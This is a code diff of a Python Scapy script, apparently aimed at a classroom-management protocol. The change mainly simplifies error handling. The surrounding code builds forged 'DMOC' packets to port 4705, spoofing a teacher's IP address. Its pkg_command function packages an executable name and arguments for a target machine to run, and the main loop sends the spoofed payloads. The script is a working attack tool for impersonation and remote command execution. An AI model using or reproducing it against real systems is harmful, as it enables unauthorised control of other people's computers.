@@ -10,44 +10,10 @@ The script uses Scapy for packet manipulation and sending.
 """
 
 import secrets
-import warnings
 
-from typing import Literal, Type
+from typing import Literal
 
 import scapy.all as scapy
-
-
-def throw_error(
-    message: str,
-    *,
-    error: Type[Exception] = ValueError,
-    warning: Type[Warning] = UserWarning,
-    errors: Literal["error", "warning", "ignore"] = "error",
-) -> None:
-    """
-    Throws an error or warning based on the specified error handling strategy.
-
-    Args:
-        message (str): The error or warning message.
-        error (Type[Exception], optional): The exception type to raise if errors are set to "error". Defaults to ValueError.
-        warning (Type[Warning], optional): The warning type to issue if errors are set to "warning". Defaults to UserWarning.
-        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".
-
-    Raises:
-        error: If errors is set to "error", raises the specified exception.
-        warning: If errors is set to "warning", issues a warning of the specified type.
-        ValueError: If errors is set to an invalid value.
-        None: If errors is set to "ignore", does nothing.
-    """
-    match errors:
-        case "error":
-            raise error(message)
-        case "warning":
-            warnings.warn(message, category=warning, stacklevel=2)
-        case "ignore":
-            pass
-        case _:
-            raise ValueError(f"Invalid error handling strategy: {errors}")
 
 
 def ip_to_tuple(ip: str) -> tuple[int, int, int, int]:
@@ -151,41 +117,32 @@ def ip_analyze(ip: str) -> list[str]:
     return [f"{ip_tuple[0]}.{ip_tuple[1]}.{ip_tuple[2]}.{ip_tuple[3]}"]
 
 
-def format_data(
-    data: str,
-    max_length: int,
-    *,
-    errors: Literal["error", "warning", "ignore"] = "error",
-) -> bytes:
+def format_data(data: str, max_length: int) -> bytes:
     """
     Formats a string into a byte array, ensuring it is within the specified maximum length.
 
     Args:
         msg (str): The input string to format.
         max_length (int, optional): The maximum length of the resulting byte array. Defaults to 800.
-        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".
 
     Returns:
         bytes: The formatted byte array, padded with null bytes if necessary.
     """
     if not isinstance(data, str):
-        throw_error(f"Expected string, got {type(data).__name__}", errors=errors)
-    if not isinstance(max_length, int) or max_length <= 0:
-        throw_error(f"Invalid maximum length: {max_length}", errors=errors)
+        raise TypeError(f"Expected string, got {type(data).__name__}")
+    if not isinstance(max_length, int):
+        raise TypeError(f"Expected int, got {type(max_length).__name__}")
+    if max_length <= 0:
+        raise ValueError(f"Invalid maximum length: {max_length}")
     return data.encode("utf-16le").ljust(max_length, b"\x00")[:max_length]
 
 
-def pkg_message(
-    msg: str,
-    *,
-    errors: Literal["error", "warning", "ignore"] = "error",
-) -> bytes:
+def pkg_message(msg: str) -> bytes:
     """
     Packages a message string into a specific byte format, including a header and padding.
 
     Args:
         msg (str): The message string to package.
-        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".
 
     Returns:
         bytes: The packaged message as a byte array, including a header and padding.
@@ -193,7 +150,7 @@ def pkg_message(
     Raises:
         ValueError: If the message length exceeds 800 bytes or if the header length is incorrect
     """
-    data = format_data(msg, 800, errors=errors)
+    data = format_data(msg, 800)
     head = (
         b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
         + secrets.token_bytes(16)
@@ -207,8 +164,6 @@ def pkg_command(
     executable_file: str,
     arguments: str = "",
     mode: Literal["normal", "minimize", "maximize"] = "normal",
-    *,
-    errors: Literal["error", "warning", "ignore"] = "error",
 ) -> bytes:
     """
     Packages a command with an executable file and optional arguments into a specific byte format.
@@ -217,7 +172,6 @@ def pkg_command(
         executable_file (str): The name of the executable file to run.
         arguments (str, optional): The command-line arguments to pass to the executable. Defaults to an empty string.
         mode (Literal["normal", "minimize", "maximize"], optional): The mode of execution. Defaults to "normal".
-        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".
 
     Returns:
         bytes: The packaged command as a byte array, including a header and formatted data.
@@ -237,18 +191,17 @@ def pkg_command(
         + b" N\x00\x00\xc0\xa8\xe9\x01a\x03\x00\x00a\x03\x00\x00"
         + b"\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
     )
-    data0 = format_data(executable_file, 512, errors=errors)
-    data1 = format_data(arguments, 254, errors=errors)
-    data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    data0 = format_data(executable_file, 512)
+    data1 = format_data(arguments, 254)
     match mode:
         case "normal":
-            pass  # No additional data needed for normal mode
+            data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         case "minimize":
             data2 = b"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         case "maximize":
             data2 = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         case _:
-            throw_error(f"Invalid mode: {mode}", errors=errors)
+            raise ValueError(f"Invalid mode: {mode}")
     return head + data0 + data1 + b"\x00" * 66 + data2
 
 
@@ -282,5 +235,5 @@ if __name__ == "__main__":
         if not tmsg:
             print("Exiting...")
             break
-        payload = pkg_message(tmsg, errors="error")
+        payload = pkg_message(tmsg)
         send_packet(teacher_ip, target, 4705, payload)
